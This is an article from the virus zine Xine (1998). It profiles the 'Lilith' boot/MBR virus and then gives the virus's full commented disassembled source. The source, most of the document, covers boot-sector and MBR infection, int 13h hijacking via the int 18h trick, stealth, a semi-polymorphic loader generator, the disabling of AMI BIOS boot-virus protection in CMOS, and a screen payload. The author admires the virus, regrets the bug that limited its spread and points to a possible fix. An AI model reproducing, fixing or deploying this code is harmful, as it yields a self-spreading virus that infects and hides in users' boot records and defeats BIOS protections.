; 
;                                         /-----------------------------\
;                                         | Xine - issue #3 - Phile 304 |
;                                         \-----------------------------/
; 
; 
; 
;                         Virus Spotlite: Lilith
;                       by b0z0/iKX,  Padania 1998
; 
; Virus Name      : Lilith
; Origin          : Milan (Padania), 1995
; AV Name         : Lilith
; Type            : Boot/MBR infector, full stealth on MBR, semipoly
; Lenght          : 1536 bytes (+ variable lenght semipoly loader)
; 
; Introduction:
; ФФФФФФФФФФФФФ
;  This is a quite old but very interesting Padanian boot virus. Lilith is
; the first boot virus that implemented the 18_tech (so redirecting the int13h
; vector to a 'CD18', int 18h, opcode in ROM and then hooking int 18h. Check out
; Dandler's article in Xine#2 for everything about this method) so it is fully
; windoze compatible thus no silly messages appears at loading while the virus is
; present. Apart this Lilith many other interesting features: disables boot virus
; protection on AMI bioses, creates a semipoly loader that will load at boot time
; the real body of the virus, it's full stealth on MBR, checks if probably another
; boot virus on the target (so preventing conflicts), has a payload and other
; things. It is well coded, with clear and interesting routines.
;  It is a shame that the virus has a quite strange bug in the loader generation
; routines, since without that bug I think it should really have good chanches
; to stay in the wild (go read about its story in Dandler's article in this zine).
; The bug is not just coder's fault, but is due to some brain-damaged checks on
; some BIOSes.
; 
; General tech aspects:
; ФФФФФФФФФФФФФФФФФФФФФ
;  When the virus will get control from the mutating loader (more about this in
; the next section) it will store the original int13h vector and then get 2kbs
; of memory (by substracting from [413h]) and copy itself up there. If the
; condition for the payload activation is satisfacted (the lowest nibble of
; the timer is 1100b) then the virus will hook Int 05h (print screen). Anyway
; the virus will search for the 0cd18h in ROM (starting from 0f000h:0000)
; and then will redirect the Int 13h to the founded opcode in ROM. Also Int 18h
; will be hooked of course. After this the virus is ready to infect new floppyes,
; but before leaving the control to the old boot (or MBR) the virus will try to
; infect MBR and then load the original boot.
;  Nothing special till now, but the interesting stuff comes now. When the int
; handler will see an interesting function (read/write on boot or mbr) it will
; try to infect the victim. If the function is done on MBR then the virus will
; check if it is already infected and if so it will return the original MBR. If
; it isn't infected of course the virus will infect it. When a floppy is the
; victim the virus will check if the data in the BPB of the floppy seems
; interesting, thus bad or unformatted floppyes won't be infected. This checks
; are quite simple (comparations of the bytes per sector, sectors on disk,
; sectors on track and sides with some given stable values) but effective. Also
; the usual check for the 55aah as the last two bytes of the sector will be done.
; Another check is now done on both MBR and floppy: check for probable other boot
; virus. Lilith will search the sector for three quite usual strings founded
; in boot viruses that are:
;         mov     word ptr [413h],ax
;         dec     word ptr [413h]
;         sub     word ptr [413h],xx
; This check is quite simple, but is able to prevent some conflicts with many
; other boot viruses.
; If all the checks are ok, then the virus will calculate where to store its
; body (3 sectors) and the original boot sector on the disk. On MBR infection
; the place for this 4 sectors is stable, while isn't stable on flopppy disks.
; The virus, using the data founded in the BPB, will calculate the place for
; itself on the last four sectors of the last track on the last side of the
; floppy. With this interesting way the Lilith won't have problems with different
; floppy formats. It is very interesting that the same routine that is used to
; find the place where to place the body is also used in the restoration part of
; the virus. Infact when the virus will have to read the old boot it will have to
; recalculate the position where it stored the original boot and will use again
; the same routine (that will also check again that the boot is still intact,
; no other viruses there and so on).
; Saved the main body and original boot the virus will create the poly loader,
; that will load at the boot the body of the virus that will be placed on the
; calculated position on the disk. But I'll talk more deeply later about this
; part.
; When the loader is done to prevent warnings to the user the virus will disable
; the AMI bios boot virus protection, write the boot/mbr with the loader and then
; restore the settings of the cmos. And finally the control will be returned back
; to the interrupt caller.
; Finally some words about the payload. The virus will hook Int 05 (the print
; screen), so most likely when the user will press the PtrSc key this routine
; will be activated. The virus will set the screen to 40x25 mode, clear it
; and then display its message on given offsets on the video. When the entire
; message will be displayed its color will be changed. This will be done by
; changing the color register R/G/B components. Each color component should
; either be modified in the loop (inc or dec at each evolution) or be stable.
; This choices are done somewhat randomly.
; 
; Mutating loader generation:
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФ
; The routine that creates the mutating loader that gives control to the virus is
; very interesting. What it must basically generate is the code to jump from the
; beginning of the boot (0:7c00) to the rest of the routine (skipping the BPB),
; setup the stack (so SS:SP will be 0:7c00), set the ES register to 0 (as CS and
; SS), the BX register to 7e00h, set the CX and DX registers so they point to
; the virus body stored on the floppy (MBR), set AX to a read for three sectors,
; execute and Int 13h and then jump to the loaded virus body (0:7e00h).
; Of course some things (like the CX and DX and AX assignation for the disk read)
; can be done in a random way, but some need a specific order.
; To make all this easyer the virus uses some tables with some internal
; pseudocommands. In this way when the loader creation routine will get a given
; command byte will know how can this be done. The lower nibble of the byte
; will be used as an added parameter, while the high nibble is the real command.
; Let's see the complete table of commands:
; 
;   0000b  =  0xh  = just skip
;   0001b  =  1xh  = jump directly to the value in BX
;   0010b  =  2xh  = copy CH bytes from DS:BX to ES:DI
;   0100b  =  4xh  = do all the elements of the table at DS:BX in the given order
;   1000b  =  8xh  = do just one from the table at DS:BX
;   1100b  =  Cxh  = do all the elements of the table at DS:BX in a random order
; 
; So what is the use of all this? When main routine (process data) will get one
; of this "commands" it will call another routine that do the given set of
; instructions. So at the very beginning the routine will get a 047h, since it
; will have to create all the 07h important stages (they are the jump, the
; initialization of AX and a cli, the stack set, the es set, the registers set
; for the read, the int13h execution and the jump to the virus). It will also be
; supplied with a table with the adresses to this 07h stages. The routine will
; get the first adress and check which command is there, that is a 82h with a
; table of two adresses. So the routine will have to select one (the 8xh command)
; of the two ways (the x2h) of creating the first jump over the BPB. Since each
; of this two adresses for the way of creating the jump point to a 1xh then the
; routine will simply jump there and so create the initial jump. Then the routine
; will pass to the second important stage. Here we have a C2h, so the routine
; will consider both the elements of the table, but in random order.
; And so on, hope you got the idea of how it works. Check out the code, is clear
; and commented enough to make a fast idea on how it works, but it is rather
; strange to describe with words :)
; In this way the routine will select (where possible) between a set of
; instructions that do some needed work (for example to make AX became zero the
; VW put 5 ways to do so) and in a random order (again, where possible... of
; course you can't first code then jump to the virus body at 0:7e00h as the
; first thing, hehe :) ).
; The routines are quite interesting, since there is some sorta internal code to
; create the loader, really fun and goodlooking code. Of course the possible
; mutations of the loader are quite limited and it should not be too difficoult
; to spot nowadays, but, again, the code is rather interesting.
; And finally to the sorta bug of the virus that is included just in the code
; generation. This isn't just a real virus bug, but rather a dummy check of the
; BIOS programmers. Infact many BIOSes when will see a a JMP SHORT (opcode 0EBh)
; as the first byte of the boot sector will check if the third byte is a NOP
; (opcode 90h). If this third byte isn't a NOP they will just stop there,
; claiming the floppy is not valid. As you can spot from the code the virus
; doens't put a NOP there, but a 00h :-( So when an infected floppy will be used
; on such a shitty BIOS, the system will just hang there :-((( Really a shame
; for such a interesting virus, really :-(
; 
; Well, that's all, greetings to the author of the Lilith and thanx to Dandler
; for some very important hints ;)
; 
; Here comes the source, enjoy!


;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл                                                  лл
;лл                              LILITH                                  лл
;лл                        Milan, Padania, 1995                          лл
;лл                                                                      лл
;лл                         Disasm by b0z0/iKX                           лл
;лл                            Padania 1998                              лл
;лл                                                                      лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

lilith          segment byte public
                assume  cs:lilith, ds:lilith

        org 0

boot_start:
                jmp     short load_vir
                nop

                db      4bh     dup (00)
load_vir:
                cli
                mov     ax,0
                mov     sp,7c00h                ; a sample virus loader to
                mov     ss,ax                   ; make installation faster :)
                push    ss
                pop     es
                mov     ax,0203h
                mov     bx,7e00h                ; if you don't know what this
                mov     cx,0002h                ; is then you don't need to
                mov     dx,0000h                ; use this ;)
                int     13h
                jmp     lilith_start

                org     200h - 2h
boot_end        db      55h,0aah

; Virus body starts here. This is placed on three sectors of the floppy.
; This is loaded to 0:7e00h when the virus starts, while is set at offset
; 200h of the virus segment when memory is reserved.

lilith_start:
                sti
        cld
        push    es
        pop ds
        push    dx
                or      dl,80h                  ; reset disk
        sub ah,ah
                int     13h

                pop     dx
                cmp     byte ptr ds:[4efh],'L'          ; residency check
                jne     must_load
                jmp     already_on
must_load:
                mov     byte ptr ds:[4efh],'L'

                push    es
                les     bx,dword ptr ds:[13h * 4]       ; save orig int 13h
                mov     word ptr ds:[orig13h + 7c00h],bx
                mov     word ptr ds:[orig13h + 2 + 7c00h],es
        pop es

                mov     ax,word ptr ds:[413h]
                sub     ax,2                            ; sub 2 kbs of mem
                mov     word ptr ds:[413h],ax
        mov cl,6
        shl ax,cl
                mov     es,ax                           ; get virus segment

                cli
                call    get_timer
                and     al,0fh                          ; check for payload
                cmp     al,0ch                          ; activation
                jne     no_payload

                mov     word ptr ds:[05h * 4],offset int05h_handler
                mov     word ptr ds:[05h * 4 + 2],es
no_payload:
        push    es
                call    find_cd18_rom                   ; find cd18 in rom
                mov     word ptr ds:[13h * 4],bx        ; point int13 to the
                mov     word ptr ds:[13h * 4 + 2],es    ; int18 in rom
        pop es

                mov     word ptr ds:[18h * 4],offset int18h_handler
                mov     word ptr ds:[18h * 4 + 2],es    ; and hook int18

                mov     si,7e00h                ; copy virus from begin to
                mov     di,200h                 ; reserved mem starting at
                mov     cx,600h                 ; seg:200h
        rep movsb

                sti
                mov     ax,offset reloc_back    ; go running from there
        push    es
        push    ax
        retf

reloc_back:
                sub     ax,ax
        mov es,ax
        push    dx
                mov     bx,7c00h
        mov cx,1
                mov     dx,80h                  ; read (so infect since we
                mov     ax,201h                 ; already hooked int13h) mbr
                int     13h

                pop     dx
                mov     bx,7c00h                ; read again boot from
                mov     cx,1                    ; which we were originally
                sub     dh,dh                   ; starting
        mov ax,201h
                int     13h
error_loop0:
                jc      error_loop0
already_on:
                mov     bx,7c00h
                call    check_boot_ok
                cmp     cl,0ffh                 ; if bad boot just loop here
error_loop1:
                je      error_loop1
                mov     ax,201h                 ; else read original boot
                int     13h
error_loop2:
                jc      error_loop2
        push    es
                push    bx                      ; and pass control to orig
                retf                            ; boot

find_cd18_rom:
                mov     ax,0f000h
                mov     es,ax                   ; to rom
        sub bx,bx
loop_18h:
        inc bx
                cmp     word ptr es:[bx],18cdh  ; search int18h
                jne     loop_18h
        retn

int05h_handler:
                mov     al,20h
                out     20h,al                  ; disable irq5

                mov     ax,1                    ; set video to 40x25
                int     10h

                mov     cx,2000h                ; set cursor type
                mov     ax,101h
                int     10h

                mov     ax,0b800h               ; on video mem
        mov es,ax
        sub di,di

                mov     cx,(40d * 25d)
                mov     ax,7020h                ; clear entire video
        rep stosw

                push    cs
        pop ds
                mov     si,offset payload       ; on data for payload
get_offset_vm:
        lodsw
                mov     di,ax                   ; get offset where to draw
out_text:
        lodsb
                cmp     al,0dh                  ; if end get next offset
                je      get_offset_vm
                cmp     al,0                    ; end of entire stuff?
                je      end_text
        stosb
                inc     di                      ; leave text attributes
                jmp     short out_text
end_text:
        sub ch,ch
        sub cl,cl
        sub dh,dh
begin_cycle:
                call    get_timer
                and     al,7                    ; get 3 random bits
        cmp al,0
                je      begin_cycle

                mov     dl,al                   ; put in regs for color
                shr     al,1                    ; changing
        mov bl,al
        shr al,1
        mov bh,al

                and     bh,1
                and     bl,1                    ; just one bit for color reg
                and     dl,1                    ; change. 1 will change (up or
                                                ; down) while 0 no change

                cmp     ch,3fh                  ; if max color then color will
                jne     no_inv1                 ; decrease instead of
                neg     bh                      ; increasing
no_inv1:
                cmp     cl,3fh                  ; if max then invert
                jne     no_inv2
        neg bl
no_inv2:
                cmp     dh,3fh                  ; if max then invert
                jne     no_inv3
        neg dl
no_inv3:
                mov     si,3fh                  ; trough all the possible

cycle_components:
                cmp     si,0                    ; end?
                je      begin_cycle

                push    bx
        sub bx,bx
                mov     ax,1010h                ; set color register bx to
                int     10h                     ; dh/ch/cl (r/g/b)
        pop bx

                dec     si
                add     ch,bh                   ; change the color components
                add     cl,bl                   ; as decided before
        add dh,dl
        push    cx
        mov cx,4

wait_loop0:
        push    cx
                mov     cx,0ffffh               ; wait a bit here
wait_loop1:
                loop    wait_loop1

        pop cx
                loop    wait_loop0
        pop cx

                jmp     short cycle_components  ; again changing colors

int18h_handler:
                cli
                add     sp,6            ; correct stack for int18h tech
        sti
                cmp     ah,2            ; reading or writing?
                jb      chain_old
        cmp ah,3
                ja      chain_old
                cmp     cx,1            ; possible boot/mbr?
                jne     chain_old
        cmp dh,0
                jne     chain_old
                cmp     dl,80h          ; first disk or floppy?
                jbe     possible_infect
chain_old:
                jmp     dword ptr cs:[orig13h]


possible_infect:
                call    call_orig13h            ; do the requested call
                jnc     try_infect              ; if succesfull then try to
                jmp     bad_operation           ; infect

try_infect:
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    bp
        push    ds
        push    es
        pushf

                cmp     byte ptr es:[bx+1],4ch  ; already infected?
                jne     infect_it

                cmp     dl,80h                  ; reading mbr?
                jne     infect_it

                call    check_boot_ok           ; so check if infected and if
                cmp     cl,0ffh                 ; so set CX/DX to original copy
                je      infect_it               ; else infect

                mov     ax,201h                 ; read original -> stealth
                call    call_orig13h
                jmp     short exit_binf         ; work done
infect_it:
                cmp     byte ptr es:[bx+1],4ch  ; infected? (but from fd)
                je      exit_binf               ; if so just leave

                mov     si,bx
        mov di,es

                call    check_boot_ok   ; check if boot/mbr is ok

                cmp     cl,0ffh         ; ff= error, else in CX/DX we have
                je      exit_binf       ; params where to write the virus

                cld
        push    si
        push    di
        push    es
        pop ds
        push    cs
        pop es

                mov     si,bx
                mov     di,0            ; copy the user buffer (of the read
                push    cx              ; or write, so the floppy boot or mbr)
                mov     cx,200h         ; to our buffer at vir_seg:0
        rep movsb

                pop     cx
        pop di
        pop si

                mov     bx,0
                mov     ax,304h         ; CX and DX already set to where to
                push    ax              ; write. So write 4 secs: orig boot/mbr
                call    call_orig13h    ; + virus body
        pop ax
                jc      exit_binf

                call    make_loader     ; create loader that will load the
                                        ; virus at boot

                call    read_cmos_inf
        push    ax
                and     al,0bfh         ; disable boot virus protection on
                call    write_cmos_inf  ; AMI bioses

                mov     bx,0
        mov cx,1
        sub dh,dh
        mov ax,301h
                call    call_orig13h    ; write new boot/mbr with loader
        pop ax

                call    write_cmos_inf  ; restore the virus protection info
                                        ; as it was before in cmos
exit_binf:
        popf
        pop es
        pop ds
        pop bp
        pop di
        pop si
        pop dx
        pop cx
        pop bx
        pop ax
bad_operation:
        retf    2

call_orig13h:
        pushf
                call    dword ptr cs:[orig13h]
        retn

check_boot_ok:
                call    check_phys
                jc      bad_fd_hd

                call    check_vir
                jc      bad_fd_hd

                cmp     dl,80h
                je      disk_here

; then we have a floppy. now the code sets in CX and DX the values where
; the virus is (if this routine is called at the boot time) or where the
; virus will be written (when this routine is called at infection). The
; virus will always put itself on four sectors of the floppy starting
; from the last track (calculated below), on the last side (so value at
; side in the boot sector - 1, since 0 means 1 side) and on the last 4
; sectors of the track.

                push    dx
                mov     ax,es:[bx+13h]          ; total sectors
        cwd
                mov     cx,es:[bx+18h]          ; sectors per track
        div cx
        cwd
                mov     cx,es:[bx+1ah]          ; sides
        div cx
        mov ch,al
        dec ch
        pop dx

                mov     cl,es:[bx+18h]          ; sectors per track
                sub     cl,4                    ; last four

                mov     dh,es:[bx+1ah]          ; sides
                dec     dh                      ; - 1
        retn

disk_here:
; while the place on the hd is stable
                sub     ch,ch
                mov     cl,0ch
        sub dh,dh
        retn

bad_fd_hd:
                mov     cl,0ffh                         ; failure value
        retn


check_phys:
                cmp     dl,80h                          ; no check for hd
                je      hd_boot

; if floppy then do some consistency checks on the data in the BPB to
; be quite sure it is formatted and valid

                cmp     word ptr es:[bx+0Bh],200h       ; bytes per sector
                jne     bad_boot
                cmp     word ptr es:[bx+13h],0          ; secs on disk
                je      bad_boot
                cmp     word ptr es:[bx+18h],0          ; secs per track
                je      bad_boot
                cmp     word ptr es:[bx+1ah],2          ; sides
                ja      bad_boot
hd_boot:
                cmp     word ptr es:[bx + 1feh],0aa55h  ; valid boot?
                jne     bad_boot
        clc
        retn
bad_boot:
        stc
        retn

check_vir:
; try to check if it is infected by another boot virus by looking for three
; typical strings. this will prevent some conflicts with other boot viruses
        push    bx
        mov ax,bx
                add     ax,1fch
vir_loop:
        cmp bx,ax
                je      end_scan
                cmp     byte ptr es:[bx],0a3h   ; mov word ptr [413h],ax
                jne     not_this1
        cmp byte ptr es:[bx+1],13h
                jne     not_this1
        cmp byte ptr es:[bx+2],4
                je      probable_one
not_this1:
                cmp     byte ptr es:[bx],0ffh   ; dec word ptr [413h]
                jne     not_this2
                cmp     byte ptr es:[bx+1],0eh
                jne     not_this2
        cmp byte ptr es:[bx+2],13h
                jne     not_this2
        cmp byte ptr es:[bx+3],4
                je      probable_one
not_this2:
                cmp     byte ptr es:[bx],83h    ; sub word ptr [413h],
                jne     not_this3
                cmp     byte ptr es:[bx+1],2eh
                jne     not_this3
        cmp byte ptr es:[bx+2],13h
                jne     not_this3
        cmp byte ptr es:[bx+3],4
                je      probable_one
not_this3:
        inc bx
                jmp     short vir_loop
end_scan:
                pop     bx                      ; seems ok
        clc
        retn
probable_one:
                pop     bx                      ; better leave this disk
        stc
        retn

read_cmos_inf:
                call    prep_cmos_inf
                in      al,71h                  ; read in al value of cmos
                sti                             ; byte at 2dh
        retn

write_cmos_inf:
                call    prep_cmos_inf
                out     71h,al                  ; set al value to 2dh in cmos
        sti
        retn


prep_cmos_inf:
        push    ax
                mov     al,2dh                  ; ami bios configuration opts
        cli
                out     70h,al                  ; prepare for read from cmos
                jcxz    $+2                     ; the byte at 2dh
        pop ax
        retn


make_loader:
        push    ds
        push    cs
        pop ds
                mov     byte ptr ds:[orig_al],al        ; save input data,
                dec     byte ptr ds:[orig_al]           ; this is the place
                mov     byte ptr ds:[orig_ch],ch        ; where the virus
                mov     byte ptr ds:[orig_cl],cl        ; is placed, so what
                inc     byte ptr ds:[orig_cl]           ; the loader must
                mov     byte ptr ds:[orig_dh],dh        ; read
                mov     byte ptr ds:[orig_dl],dl
                and     byte ptr ds:[orig_dl],80h

                push    si
        push    di
                mov     di,0                            ; destination mem
                mov     bx,offset loader_data
                call    process_data                    ; do the virus loader
        pop di
        pop si
        pop ds
        retn

process_data:
                mov     al,byte ptr [bx]        ; get cmd from mem
                inc     bx              ; on parameter table
        mov ch,al
                and     al,0f0h         ; in AL the command
                xor     ch,al           ; in CH parameter for command

                cmp     al,80h          ; select one from given table
                je      select_one

                cmp     al,40h          ; do all the ones from given table
                je      main_do_inseq   ; in given order

                cmp     al,20h          ; copy CH bytes from given mem addr
                je      copy_chbytes

                cmp     al,10h          ; jump to value in BX
                je      execute_on_bx

                cmp     al,0            ; do nothing
                je      just_return

                cmp     al,0c0h         ; do all the ones from given table
                je      do_all_seq      ; in random order

corrupted_loop:
                jmp     short corrupted_loop    ; else some error!

select_one:
                call    get_timer
check_sel:
        cmp al,ch
                jbe     sel_ok                  ; select one in <= max
        sub al,ch
                jmp     short check_sel
sel_ok:
        cmp al,0
                je      select_one              ; not = 0
        sub ah,ah
        dec ax
                shl     ax,1                    ; * 2 for offset in mem
                add     bx,ax                   ; add offset to base
                mov     bx,word ptr [bx]
                jmp     short process_data      ; get addr and process

main_do_inseq:
                mov     cl,ch           ; number of entries
loop_mainseq:
                cmp     cl,0
                je      end_mainseq

                push    cx
        push    bx
                mov     bx,[bx]         ; get adress of data to process
                call    process_data    ; process
        pop bx
        pop cx

                add     bx,2            ; on next one
                dec     cl
                jmp     short loop_mainseq
end_mainseq:
                retn

copy_chbytes:
        mov cl,ch
copy_loop:
        cmp cl,0
                je      copy_end
                mov     al,byte ptr [bx]
        inc bx
        stosb
        dec cl
                jmp     short copy_loop
copy_end:
        retn

execute_on_bx:
                jmp     bx                      ; jump to that code

just_return:
        retn

do_all_seq:
        sub si,si
                mov     cl,ch                   ; nr of entries
do_all_loop:
        cmp cl,0
                je      end_do_all_c0
get_one:
                call    get_timer
select_whichone:
        cmp al,ch
                jbe     good_sel
        sub al,ch
                jmp     short select_whichone
good_sel:
        sub ah,ah
        dec ax

                push    ax
        push    cx
        mov cl,al
                mov     ax,1            ; in this way each bit represents
                shl     ax,cl           ; one done instruction
        mov cx,ax
                and     ax,si           ; check if this one already done
                or      si,cx           ; set this as already done
        cmp ax,0
        pop cx
        pop ax
                jnz     get_one         ; this already done, redo

                shl     ax,1            ; * 2 for offset in mem

                push    bx
        push    cx
                add     bx,ax           ; add to begin of the table
                mov     bx,word ptr [bx]
                call    process_data    ; get addr of new and process it
        pop cx
        pop bx

                dec     cl
                jmp     short do_all_loop
end_do_all_c0:
                retn

get_timer:
        push    ds
        sub ax,ax
        mov ds,ax
                mov     al,byte ptr ds:[46ch]
        pop ds
        retn

orig_al         db      00h             ; saved parameters from call
orig_ch         db      00h
orig_cl         db      00h
orig_dh         db      00h
orig_dl         db      00h

; tables and constructs for the loader generation follows
loader_data:
                db      (40h + 07h)        ; 7 stages to create in given order
                dw      offset init_jmp         ; jmp over BPB
                dw      offset begin_init       ; AX = 0 and CLI
                dw      offset set_stack        ; SS:SP = 0:7c00
                dw      offset set_essti        ; ES = 0 and STI
                dw      offset set_registers    ; set AX,CX,DX to read virus
                dw      offset do_int13h        ; call to int 13h
                dw      offset to_virus         ; jump to virus (0:7e00)

init_jmp:
                db      (80h + 02h)             ; 2 ways for the first jump
                dw      offset init_jmp_1
                dw      offset init_jmp_2

begin_init:
                db      (0c0h + 02h)            ; do both in rnd order
                dw      offset set_cli
                dw      offset zero_ax

zero_ax:
                db      (80h + 05h)             ; select one of the 5 ways
                dw      offset zero_ax_1        ; to zero AX
                dw      offset zero_ax_2
                dw      offset zero_ax_3
                dw      offset zero_ax_4
                dw      offset zero_ax_5

set_stack:
                db      (0c0h + 02h)            ; set stack in two passages
                dw      offset set_stack_1      ; set SS
                dw      offset set_stack_2      ; set SP

set_essti:
                db      (0c0h + 02h)
                dw      offset set_es           ; set ES = 0
                dw      offset set_sti          ; STI

set_es:
                db      (80h + 04h)
                dw      offset set_es_1
                dw      offset set_es_2
                dw      offset set_es_3
                dw      offset set_es_4

set_sti:
                db      (80h + 02h)
                dw      offset sti_1
                dw      offset sti_2

set_registers:
                db      (0c0h + 04h)
                dw      offset set_bx
                dw      offset set_cx
                dw      offset set_dx
                dw      offset set_ax

set_bx:
                db      (80h + 03h)
                dw      offset set_bx_1
                dw      offset set_bx_2
                dw      offset set_bx_3

set_cx:
                db      (80h + 03h)
                dw      offset set_cx_1
                dw      offset set_cx_2
                dw      offset set_cx_3

set_dx:
                db      (80h + 03h)
                dw      offset set_dx_1
                dw      offset set_dx_2
                dw      offset set_dx_3

set_ax:
                db      (80h + 03h)
                dw      offset set_ax_1
                dw      offset set_ax_2
                dw      offset set_ax_3

do_int13h:
                db      (80h + 04h)
                dw      offset do_int13h_1
                dw      offset do_int13h_2
                dw      offset do_int13h_3
                dw      offset do_int13h_4

to_virus:
                db      (80h + 04h)
                dw      offset to_virus_1
                dw      offset to_virus_2
                dw      offset to_virus_3
                dw      offset to_virus_4

init_jmp_1:
                db      (10h)
                mov     al,0ebh         ; jmp to virus loader
                stosb
                mov     al,4ch
                stosb
                sub     al,al           ; here is the BUG :-((
;               mov     al,90h          ; possible solution, but should change
                                        ; in another way so the virus lenght
                                        ; will be correct
                stosb
                add     di,4bh
                ret

init_jmp_2:
                db      (10h)
                mov     al,0e9h         ; jmp to virus loader
                stosb
                mov     al,4ch
                stosb
                sub     al,al
                stosb
                add     di,4ch
                ret

set_cli:
                db      (20h + 01h)     ; 20h means just copy, 01 is the
                cli                     ; lenght of the instruction

zero_ax_1:
                db      (20h + 02h)
                xor     ax,ax

zero_ax_2:
                db      (20h + 02h)
                sub     ax,ax

zero_ax_3:
                db      (20h + 03h)
                mov     ax,0h

zero_ax_4:
                db      (20h + 04h)
                mov     ah,0
                mov     al,0

zero_ax_5:
                db      (20h + 04h)
                mov     al,0
                mov     ah,0

set_stack_1:
                db      (20h + 02h)
                mov     ss,ax

set_stack_2:
                db      (20h + 03h)
                mov     sp,7c00h

set_es_1:
                db      (20h + 02h)
                mov     es,ax

set_es_2:
                db      (20h + 02h)
                push    ax
                pop     es

set_es_3:
                db      (20h + 02h)
                push    ss
                pop     es

set_es_4:
                db      (20h + 02h)
                push    cs
                pop     es

sti_1:
                db      (20h + 01h)
                sti

sti_2:
                db      00h

set_bx_1:
                db      (20h + 03h)
                mov     bx,7e00h

set_bx_2:
                db      (20h + 04h)
                mov     bh,7eh
                mov     bl,00h

set_bx_3:
                db      (20h + 04h)
                mov     bl,00h
                mov     bh,7eh

set_cx_1:
                db      (10h)
                mov     al,0b9h                 ; mov cx,
                stosb
                mov     al,byte ptr [orig_cl]
                stosb
                mov     al,byte ptr [orig_ch]
                stosb
                ret

set_cx_2:
                db      (10h)
                mov     al,0b5h                 ; mov ch,
                stosb
                mov     al,byte ptr ds:[orig_ch]
                stosb
                mov     al,0b1h                 ; mov cl,
                stosb
                mov     al,byte ptr ds:[orig_cl]
                stosb
                ret

set_cx_3:
                db      (10h)
                mov     al,0b1h                 ; mov cl,
                stosb
                mov     al,byte ptr [orig_cl]
                stosb
                mov     al,0b5h                 ; mov ch,
                stosb
                mov     al,byte ptr [orig_ch]
                stosb
                ret

set_dx_1:
                db      (10h)
                mov     al,0bah                 ; mov dx,
                stosb
                mov     al,byte ptr [orig_dl]
                stosb
                mov     al,byte ptr [orig_dh]
                stosb
                ret

set_dx_2:
                db      (10h)
                mov     al,0b6h                 ; mov dh,
                stosb
                mov     al,byte ptr [orig_dh]
                stosb
                mov     al,0b2h                 ; mov dl,
                stosb
                mov     al,byte ptr [orig_dl]
                stosb
                ret

set_dx_3:
                db      (10h)
                mov     al,0b2h                 ; mov dl,
                stosb
                mov     al,byte ptr [orig_dl]
                stosb
                mov     al,0b6h                 ; mov dh,
                stosb
                mov     al,byte ptr [orig_dh]
                stosb
                ret

set_ax_1:
                db      (10h)
                mov     al,0b8h                 ; mov ax,
                stosb
                mov     al,byte ptr [orig_al]
                stosb
                mov     al,02h
                stosb
                ret

set_ax_2:
                db      (10h)
                mov     ax,02b4h                ; mov ah,02h
                stosw
                mov     al,0b0h                 ; mov al,
                stosb
                mov     al,byte ptr [orig_al]
                stosb
                ret

set_ax_3:
                db      (10h)
                mov     al,0b0h                 ; mov al,
                stosb
                mov     al,byte ptr [orig_al]
                stosb
                mov     ax,02b4h                ; mov ah,02
                stosw
                ret


do_int13h_1:
                db      (20h + 02h)
                int     13h

do_int13h_2:
                db      (20h + 06h)
                pushf
                db      26h
                db      0ffh,1eh                ; call far es:[4ch]
                dw      04ch

do_int13h_3:
                db      (20h + 06h)
                pushf
                db      2eh
                db      0ffh,1eh                ; call far ss:[4ch]
                dw      04ch

do_int13h_4:
                db      (20h + 06h)
                pushf
                db      36h
                db      0ffh,1eh                ; call far cs:[4ch]
                dw      04ch


to_virus_1:
                db      (10h)
                mov     al,0e9h                 ; jmp
                stosb
                mov     ax,200h                 ; to virus entry point at
                sub     ax,di                   ; 0:7e00h, so here calc
                sub     ax,2                    ; offset
                stosw
                ret

to_virus_2:
                db      (20h + 05h)
                db      0eah                    ; jmp far 0:7e00h
                dw      7e00h,0000h

to_virus_3:
                db      (10h)
                mov     al,0e8h                 ; call
                stosb
                mov     ax,200h                 ; to virus entry point at
                sub     ax,di                   ; 0:7e00h, so here calc
                sub     ax,2                    ; offset
                stosw
                ret

to_virus_4:
                db      (20h + 05h)
                db      09ah                    ; call far 0:7e00h
                dw      7e00h,0000h

orig13h         dw      9A44h, 0F000h

payload:
                dw      332h                            ; offset in vmem
                db       'L њ I њ L њ I њ T њ H',0dh

                dw      37eh                            ; offset in vmem
                db      'Tu del creato prima Donna', 0dh

                dw      3cch                            ; offset in vmem
                db      'del Sesso Maestra infernale', 0dh

                dw      418h                            ; offset in vmem
                db      'accogli le Nostre dannate Carni', 0dh

                dw      470h                            ; offset in vmem
                db      'nel Tuo satanico Ventre', 0

origin          db      'Milan Italy 95'

boot_mrk        db       55h,0aah

lilith          ends
                end     boot_start

